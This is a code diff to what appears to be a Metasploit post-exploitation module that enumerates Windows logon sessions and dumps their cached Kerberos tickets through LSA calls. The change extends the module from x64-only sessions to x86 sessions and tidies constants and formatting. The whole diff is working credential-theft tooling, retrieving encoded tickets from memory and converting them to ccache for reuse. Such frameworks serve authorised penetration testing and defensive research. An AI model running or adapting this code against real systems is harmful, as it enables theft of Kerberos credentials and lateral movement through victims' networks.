@@ -12,6 +12,9 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Lsa
   include Msf::Exploit::Remote::Kerberos::Ticket
 
+  CURRENT_PROCESS = -1
+  CURRENT_THREAD = -2
+
   # https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/ne-ntsecapi-security_logon_type
   SECURITY_LOGON_TYPE = {
     0 => 'UndefinedLogonType',
@@ -91,11 +94,16 @@ class MetasploitModule < Msf::Post
   end
 
   def run
+    case session.native_arch
+    when ARCH_X64
+      @ptr_size = 8
+    when ARCH_X86
+      @ptr_size = 4
+    else
+      fail_with(Failure::NoTarget, "This module does not support #{session.native_arch} sessions.")
+    end
     @hostname_cache = {}
     @indent_level = 0
-    unless session.native_arch == ARCH_X64
-      fail_with(Failure::NoTarget, 'This module only support x64 sessions.')
-    end
 
     send("action_#{action.name.downcase}")
   end
@@ -119,7 +127,7 @@ class MetasploitModule < Msf::Post
     end
     luids ||= [ get_current_luid ]
 
-    print_status("LSA Handle: 0x#{handle.to_s(16).rjust(16, '0')}")
+    print_status("LSA Handle: 0x#{handle.to_s(16).rjust(@ptr_size * 2, '0')}")
     auth_package = lsa_lookup_authentication_package(handle, 'kerberos')
     if auth_package.nil?
       lsa_deregister_logon_process(handle)
@@ -136,6 +144,7 @@ class MetasploitModule < Msf::Post
     current_luid = get_current_luid
     luids = lsa_enumerate_logon_sessions
     fail_with(Failure::Unknown, 'Failed to enumerate logon sessions.') if luids.nil?
+
     luids.each do |luid|
       logon_session_data_ptr = lsa_get_logon_session_data(luid)
       unless logon_session_data_ptr
@@ -166,7 +175,10 @@ class MetasploitModule < Msf::Post
     session.railgun.secur32.LsaFreeReturnBuffer(logon_session_data_ptr.value)
 
     logon_session_data_ptr.contents.logon_id.clear if null_luid
-    query_tkt_cache_req = KERB_QUERY_TKT_CACHE_REQUEST.new(message_type: KERB_QUERY_TICKET_CACHE_EX_MESSAGE, logon_id: logon_session_data_ptr.contents.logon_id)
+    query_tkt_cache_req = KERB_QUERY_TKT_CACHE_REQUEST.new(
+      message_type: KERB_QUERY_TICKET_CACHE_EX_MESSAGE,
+      logon_id: logon_session_data_ptr.contents.logon_id
+    )
     query_tkt_cache_res_ptr = lsa_call_authentication_package(handle, auth_package, query_tkt_cache_req)
     if query_tkt_cache_res_ptr
       indented_print do
@@ -177,15 +189,31 @@ class MetasploitModule < Msf::Post
   end
 
   def dump_session_tickets(handle, auth_package, logon_session_data_ptr, query_tkt_cache_res_ptr)
-    tkt_cache = KERB_QUERY_TKT_CACHE_RESPONSE_x64.read(query_tkt_cache_res_ptr.contents)
+    case session.native_arch
+    when ARCH_X64
+      query_tkt_cache_response_klass = KERB_QUERY_TKT_CACHE_RESPONSE_x64
+      retrieve_tkt_request_klass = KERB_RETRIEVE_TKT_REQUEST_x64
+      retrieve_tkt_response_klass = KERB_RETRIEVE_TKT_RESPONSE_x64
+    when ARCH_X86
+      query_tkt_cache_response_klass = KERB_QUERY_TKT_CACHE_RESPONSE_x86
+      retrieve_tkt_request_klass = KERB_RETRIEVE_TKT_REQUEST_x86
+      retrieve_tkt_response_klass = KERB_RETRIEVE_TKT_RESPONSE_x86
+    end
+
+    tkt_cache = query_tkt_cache_response_klass.read(query_tkt_cache_res_ptr.contents)
     tkt_cache.tickets.each_with_index do |ticket, index|
       server_name = read_lsa_unicode_string(ticket.server_name)
-      next if datastore['SERVICE'].present? && !File.fnmatch?(datastore['SERVICE'], server_name.split('@').first, File::FNM_CASEFOLD | File::FNM_DOTMATCH)
+      if datastore['SERVICE'].present? && !File.fnmatch?(datastore['SERVICE'], server_name.split('@').first, File::FNM_CASEFOLD | File::FNM_DOTMATCH)
+        next
+      end
 
       server_name_wz = session.railgun.util.str_to_uni_z(server_name)
       print_status("Ticket[#{index}]")
       indented_print do
-        retrieve_tkt_req = KERB_RETRIEVE_TKT_REQUEST_x64.new(message_type: KERB_RETRIEVE_ENCODED_TICKET_MESSAGE, logon_id: logon_session_data_ptr.contents.logon_id, cache_options: 8)
+        retrieve_tkt_req = retrieve_tkt_request_klass.new(
+          message_type: KERB_RETRIEVE_ENCODED_TICKET_MESSAGE,
+          logon_id: logon_session_data_ptr.contents.logon_id, cache_options: 8
+        )
         ptr = session.railgun.util.alloc_and_write_data(retrieve_tkt_req.to_binary_s + server_name_wz)
         next if ptr.nil?
 
@@ -197,7 +225,7 @@ class MetasploitModule < Msf::Post
         session.railgun.util.free_data(ptr)
         next if retrieve_tkt_res_ptr.nil?
 
-        retrieve_tkt_res = KERB_RETRIEVE_TKT_RESPONSE_x64.read(retrieve_tkt_res_ptr.contents)
+        retrieve_tkt_res = retrieve_tkt_response_klass.read(retrieve_tkt_res_ptr.contents)
         if retrieve_tkt_res.ticket.encoded_ticket != 0
           ticket = kirbi_to_ccache(session.railgun.memread(retrieve_tkt_res.ticket.encoded_ticket, retrieve_tkt_res.ticket.encoded_ticket_size))
           ticket_host = ticket.credentials.first.server.components.last.snapshot
@@ -236,7 +264,7 @@ class MetasploitModule < Msf::Post
 
   def get_token_statistics(token: nil)
     if token.nil?
-      result = session.railgun.advapi32.OpenThreadToken(-2, session.railgun.const('TOKEN_QUERY'), false, 4)
+      result = session.railgun.advapi32.OpenThreadToken(CURRENT_THREAD, session.railgun.const('TOKEN_QUERY'), false, @ptr_size)
       unless result['return']
         error = ::WindowsError::Win32.find_by_retval(result['GetLastError']).first
         unless error == ::WindowsError::Win32::ERROR_NO_TOKEN
@@ -244,7 +272,7 @@ class MetasploitModule < Msf::Post
           return nil
         end
 
-        result = session.railgun.advapi32.OpenProcessToken(-1, session.railgun.const('TOKEN_QUERY'), 4)
+        result = session.railgun.advapi32.OpenProcessToken(CURRENT_PROCESS, session.railgun.const('TOKEN_QUERY'), @ptr_size)
         unless result['return']
           error = ::WindowsError::Win32.find_by_retval(result['GetLastError']).first
           print_error("Failed to open the current process token. OpenProcessToken failed with: #{error}")
@@ -254,7 +282,7 @@ class MetasploitModule < Msf::Post
       token = result['TokenHandle']
     end
 
-    result = session.railgun.advapi32.GetTokenInformation(token, 10, TOKEN_STATISTICS.new.num_bytes, TOKEN_STATISTICS.new.num_bytes, 4)
+    result = session.railgun.advapi32.GetTokenInformation(token, 10, TOKEN_STATISTICS.new.num_bytes, TOKEN_STATISTICS.new.num_bytes, @ptr_size)
     unless result['return']
       error = ::WindowsError::Win32.find_by_retval(result['GetLastError']).first
       print_error("Failed to obtain the token information. GetTokenInformation failed with: #{error}")
@@ -281,7 +309,7 @@ class MetasploitModule < Msf::Post
     if datastore['VERBOSE'] && logon_session_data_ptr.contents.psid != 0
       # reading the SID requires 3 railgun calls so only do it in verbose mode to speed things up
       # reading the data directly wouldn't be much faster because SIDs are of a variable length
-      result = session.railgun.advapi32.ConvertSidToStringSidA(logon_session_data_ptr.contents.psid.to_i, 4)
+      result = session.railgun.advapi32.ConvertSidToStringSidA(logon_session_data_ptr.contents.psid.to_i, @ptr_size)
       if result
         sid = session.railgun.util.read_string(result['StringSid'])
         session.railgun.kernel32.LocalFree(result['StringSid'])
